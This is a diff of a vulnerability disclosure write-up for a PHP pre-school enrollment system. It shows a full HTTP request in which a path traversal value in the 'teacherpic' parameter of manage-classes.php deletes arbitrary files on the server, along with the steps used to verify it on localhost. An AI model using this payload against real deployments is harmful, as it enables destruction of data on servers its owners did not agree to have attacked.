@@ -27,35 +27,35 @@
   
    ![3](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot/3.png)
   
-   Intercept the data packet and find the problematic parameter profilepic
+   Intercept the data packet and find the manage-classes.php?action=delete data packet. No problem parameter teacherpic was found.
    
-   ![4](https://github.com/baixiaobi/TST/blob/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250210100051.png)
+   ![4](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot/4.png)
 
+   Change the tpic parameter in the data packet to the problematic parameter teacherpic 
+   ![5](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot/6.png)
    Transformed into attack payload  
 
-    GET /School/preschool/admin/manage-teachers.php?action=delete&&tid=1&&profilepic=../../../../../../aaa.txt HTTP/1.1
+    GET /Pre-School-Enrollment-System-PHP/preschool/admin/manage-classes.php?action=delete&&cid=6&&teacherpic=../../../../bbb.txt HTTP/1.1
     Host: localhost
-    Sec-Fetch-User: ?1
-    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-    Accept-Encoding: gzip, deflate, br, zstd
-    sec-ch-ua-mobile: ?0
-    Upgrade-Insecure-Requests: 1
-    sec-ch-ua-platform: "Windows"
     Sec-Fetch-Site: same-origin
-    Referer: http://localhost/School/preschool/admin/manage-teachers.php
-    Accept-Language: zh-CN,zh;q=0.9
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
     Sec-Fetch-Mode: navigate
+    Accept-Encoding: gzip, deflate, br, zstd
+    Cookie: PHPSESSID=qqnj1t0sdqqbv8qh5jrevaaln8
+    sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
+    Accept-Language: zh-CN,zh;q=0.9
+    Upgrade-Insecure-Requests: 1
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Referer: http://localhost/Pre-School-Enrollment-System-PHP/preschool/admin/manage-classes.php
     Sec-Fetch-Dest: document
-    sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
-    Cookie: PHPSESSID=7t2liii8fu23b3cjsll5qi6q8t
+    sec-ch-ua-mobile: ?0
+    sec-ch-ua-platform: "Windows"
 
+   Create bbb.txt test file in  D:\phpstudy_pro\WWW
+       ![6](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot/微信截图_20250423153628.png)   
 
-   Create aaa.txt test file in the local D drive   
-       ![5](https://github.com/baixiaobi/TST/blob/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250210100159.png)   
-
-   Send payload, aaa.txt file has been deleted   
-   ![6](https://github.com/baixiaobi/TST/blob/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250210100443.png)    
+   Send payload, bbb.txt file has been deleted   
+   ![7](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot/5.png)    
    This directory traversal vulnerability can cause the traversed files to be deleted.
 
  **The affected version**   
